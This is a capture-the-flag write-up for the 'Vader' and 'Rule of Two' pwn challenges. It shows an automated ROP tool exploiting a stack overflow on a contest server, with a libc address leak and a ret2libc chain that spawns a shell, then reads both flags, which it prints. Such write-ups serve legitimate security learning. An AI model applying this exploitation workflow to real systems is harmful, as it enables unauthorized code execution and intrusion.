# Vader and Rule of Two

### This is a UNINTENDED Solution for this two challenges.

Challenge Description:

```bash  
Vader  
100  
Medium  
Submit flag from /flag.txt from 0.cloud.chals.io:20712

Author: v10l3nt

0.cloud.chals.io:20712  
```  
```bash  
Rule of Two  
375  
Hard  
"Always there are two. No more or no less." - Yoda

Submit /sith.txt flag from 0.cloud.chals.io:20712

Author: v10l3nt

0.cloud.chals.io:20712  
```

If you see close, you note that both challenge has the same address, same
port, and most important, the same binary!!

I will use an automated tool for CTF PWN resolution challenges called
[AUTOROP](https://autorop.readthedocs.io/en/latest/)

```bash  
┌──(leonuz㉿sniper)-[~[~/SpaceHeroesCTF/PWN/Vader]]  
└─$ autorop ./vader 0.cloud.chals.io 20712  
[*] '/home/leonuz/CTFs/SpaceHeroesCTF/vader'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[*] Produced pipeline: Classic(Corefile(), OpenTarget(), Puts(False,
['__libc_start_main', 'puts']), Auto(), SystemBinSh())  
[*] Pipeline [1/5]: Corefile()  
[+] Starting local process './vader': pid 9817  
[*] Process './vader' stopped with exit code -11 (SIGSEGV) (pid 9817)  
[+] Receiving all data: Done (0B)  
[+] Parsing corefile...: Done  
[*] '/home/leonuz/CTFs/SpaceHeroesCTF/core.9817'  
   Arch:      amd64-64-little  
   RIP:       0x4015f9  
   RSP:       0x7ffe4eb5c7c8  
   Exe:       '/home/leonuz/CTFs/SpaceHeroesCTF/vader' (0x400000)  
   Fault:     0x6161616161616166  
[*] Fault address @ 0x6161616161616166  
[*] Offset to return address is 40  
[*] Pipeline [2/5]: OpenTarget()  
[+] Opening connection to 0.cloud.chals.io on port 20712: Done  
[*] Pipeline [3/5]: Puts(False, ['__libc_start_main', 'puts'])  
[+] Opening connection to 0.cloud.chals.io on port 20712: Done  
[*] Loaded 20 cached gadgets for './vader'  
[*] 0x0000:         0x401016 ret  
   0x0008:         0x40165b pop rdi; ret  
   0x0010:         0x404ff0 [arg0] rdi = __libc_start_main  
   0x0018:         0x401030 puts  
   0x0020:         0x401016 ret  
   0x0028:         0x40165b pop rdi; ret  
   0x0030:         0x405018 [arg0] rdi = got.puts  
   0x0038:         0x401030 puts  
   0x0040:         0x401016 ret  
   0x0048:         0x4015b5 main()  
[*] leaked __libc_start_main @ 0x7f1409a81720  
[*] leaked puts @ 0x7f1409acfde0  
[*] Pipeline [4/5]: Auto()  
[*] Searching for libc based on leaks using libc.rip  
[!] 8 matching libc's found, picking first one  
[*] Downloading libc  
[*] '/home/leonuz/CTFs/SpaceHeroesCTF/.autorop.libc'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] Pipeline [5/5]: SystemBinSh()  
[*] Loaded 191 cached gadgets for '.autorop.libc'  
[*] 0x0000:         0x401016 ret  
   0x0008:         0x40165b pop rdi; ret  
   0x0010:   0x7f1409be2962 [arg0] rdi = 139724039530850  
   0x0018:   0x7f1409aa3850 system  
   0x0020:         0x401016 ret  
   0x0028:         0x4015b5 main()  
[*] Switching to interactive mode  
MMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxdolc;',;;::llclodkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM  
MMMMMMMMMMMMMMMMMMMMMMWXOoc;::::::;;;clkKNXxlcccc:::::cdOXWMMMMMMMMMMMMMMMMMMMMM  
MMMMMMMMMMMMMMMMMWMMNkc,;clccc;,...    .:c:.
...,;:cccc:,,ckNMWMMMMMMMMMMMMMDARK  
MMMMMMMMMMMMMMMMMMXx;;lol:'            .'.
.':loc',xNMMMMMMMMMMMMMMMMM  
MMMMMMMMMMMMMMMMW0:;dxlcc'            .dO;
.::lxo':0MMMMMMMMMMMMS1D3  
MMMMMMMMMMMMMMMWk':Ol;x0c           ';oKK: .
cOo,dk;,OMMMMMMMMMMMMMMM  
MMMMMMMMMMMMMMMO':Ol:0Xc            l0OXNc.l'
cKO;o0;,KMMMMMMMMMMMMOF  
MMMMMMMMMMMMMMX:'Oo:KMd             o0ONWc'x,
.xM0:xk.lWMMMMMMMMMMMMM  
MMMMMMMMMMMMMMx.okcOMMk.            o0OWMl'x;
.xMMklOc'OMMMMMMMMMMTH3  
MMMMMMMMMMMMMWc'xldWMMWKx'          oOkNMo,x;
'oONMMWdod.oMMMMMMMMMMMMM  
MMMMMMMMMMMMMK;:dl0MMMMMXc          lOxNMo'd;
lWMMMMMOld;:NMMMMMMMFORC3  
MMMMMMMMMMMMMO':ldWMMMMWo           ckxNMd,d;
.kMMMMMNlc;,KMMMMMMMMMMMM  
MMMMMMMMMMMMMk';cxMMMMMWOl:,.       cxxNMx;d;
.,;l0MMMMMWdc;'0MMMMMMMMMMMM  
MMMMMMMMMMMMMx',cOMMMWXOxoc;.       cxxNMkcx:
.cdkOXWMMMMd:;'0MMMMMMMMMMMM  
MMMMMMMMMMMMMx';;l0xl,.    .       ,0xdWMOcOx.
.,lkXWd:;'OMMMMMMMMMMMM  
MMMMMMMMMMMMMd.ld:'    .',;::ccc:;,kWxxWMOlONo',:cc::,'...
'ood:'OMMMMMMMMMMMM  
MMMMMMMMMMMMWl.xK:            .';coOXo:xxo:kKkl:;'.
.oXl.OMMMMMMMMMMMM  
MMMMMMMMMMMM0';d'       .......',;;''.    ..'',;,'......
lo.lWMMMMMMMMMMM  
MMMMMMMMMMMX:,l'        ..      .',:;lo. ;d:;:,..     ..
c:.xWMMMMMMMMMM  
MMMMMMMMMMNc,o,                     '0XxoOWd.
.l:,0MMMMMMMMMM  
MMMMMMMMMWd,o;                      .xMNXWWc
.o::XMMMMMMMMM  
MMMMMMMMMk,oc                    .. .kXkdONc ..
'd;oWMMMMMMMM  
MMMMMMMM0;lo.         .;:,'....  'cxxo;'''cxxo:. ......';'
:x:xWMMMMMMM  
MMMMMMMK:lx.           'xNNXXXKd;;::,.,l:..':c;,;xKKKXX0l.
oxcOMMMMMMM  
MMMMMMXcck,         ..   ,cloool:. .lc,,'.cx, .';looooc.
.kxlKMMMMMM  
MMMMMWoc0c      .'. .cdll;..',;lkOxxl:xOOxclddkkl:,''.';:cl'  ..
:KddNMMMMM  
MMMMWxc0x.       :o; .xWWKkdodkKWMMKlxWMMMKdOMMWXkdoloONMXc .cc.
.dXdxWMMMM  
MMMMOcOK;         'xd.'0MMMMMMMXk0Xc'dKXXKO:,0KkKWMMMMMMWo.;xl.
,0XxOWMMM  
MMM0lkNo           .xO;cXWWMWXd:dx; ;d;,:l:  ;xd:l0WMMMWx,oO;
oWKx0MMM  
MMKokW0'            .dKdOWMNx;ckd:. lK,.cOd..lcdO:'oXMMKokO,
.OWKkXMM  
MXdxN0;              .kWNWXc.,d;.do lK,.:kd.,0l.;o,.:KWNNK,
;KW0kNM  
NxdOc.                ,0MMd..;l''Oo lK,.;kd.;Ko .,,. lWMXc
'xXOOW  
xd0d.                  ;KMO,.c0ocXk;xXocxK0cdNOcol'''dWWd.
.o0kO  
,xWX:                   :XXc.:oddxxxxxxddxxxxkkOko;.:KNd.
'kN0l  
.,dOkdoc:,'..            .'..,lxkox0OO0kxOOxOOddxl,..,,.
..,:lkKOl.  
x,...',;:cc::;,,'''...        .,;cdO0KKKXXKkdo:,,'.
...'',,,,;;clllc;'..;  
MNKOxdoolcc::;;;;. ..             ..,;:clc;..
...,;;;,,'',;;:clox0N  
MMMMMMMMMMMMMMMMW0;
'kKXXNNNWWMMMMMMMMM  
MMMMMMMMMMMMMMMMMMNd,..          ........                ..
.kWMMMMMMMMMMMMMMMMM  
MMMMMMMMMMMMMMMMMMMWKxl;..       'okOOko:,..     ..
....';lKWMMMMMMMMMMMMMMMMMM  
MMMMMMMMMMMMMMMMMMMMMMXkdc'....   .,cc:,,'..
.'o0Oo:;:cokXMMMMMMMMMMMMMMMMMMMMM  
MMMMMMMMMMMMMMMMMMMMMMMMWXkdoc;''''',,;;:::::::ccllclx0NMMMMMMMMMMMMMMMMMMMMMMMM  
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkol:;,'.''''....,cokKWMMMMMMMMMMMMMMMMMMMMMMMMMMMM

When I left you, I was but the learner. Now I am the master >>> $

```

At this point, we can see the prompt `$` which indicate that the machine has
been pwn. Let's list the directory looking for the flags.

```bash  
When I left you, I was but the learner. Now I am the master >>> $ ls  
-  
banner_fail  
bin  
boot  
dev  
etc  
flag.txt  
home  
lib  
lib32  
lib64  
libx32  
media  
mnt  
opt  
proc  
root  
run  
sbin  
service.conf  
sith.txt  
srv  
sys  
tmp  
usr  
vader  
var  
wrapper  
$ cat flag.txt  
shctf{th3r3-1s-n0-try}  
$ cat sith.txt  
shctf{W1th0ut-str1f3-ur-v1ctory-has-no-m3an1ng}  
$  
[*] Interrupted  
[*] Closed connection to 0.cloud.chals.io port 20712  
[*] Closed connection to 0.cloud.chals.io port 20712  
  
```  
flag for "Vader" Challenge is inside of flag.txt  
##### shctf{th3r3-1s-n0-try}  
  
flag for "Rule of two" Challenge is inside of sith.txt  
##### shctf{W1th0ut-str1f3-ur-v1ctory-has-no-m3an1ng}  

- - -  
#### More Info about automatic tools for PWN here  
- [AUTOROP](https://github.com/mariuszskon/autorop)  
- [ZERATOOL](https://github.com/ChrisTheCoolHut/Zeratool)

- - -  
### Final Notes.

An excellent engineering professor taught me that **"As an engineers we can't
know ALL the answers, but we SHOULD know how to look for them"**.

- - -

Thanks [FITSEC Team](https://research.fit.edu/fitsec/) for the excellent CTF.

For fun and knowledge, always think out of the box! :)

Original writeup (https://leonuz.github.io/blog/Vader/).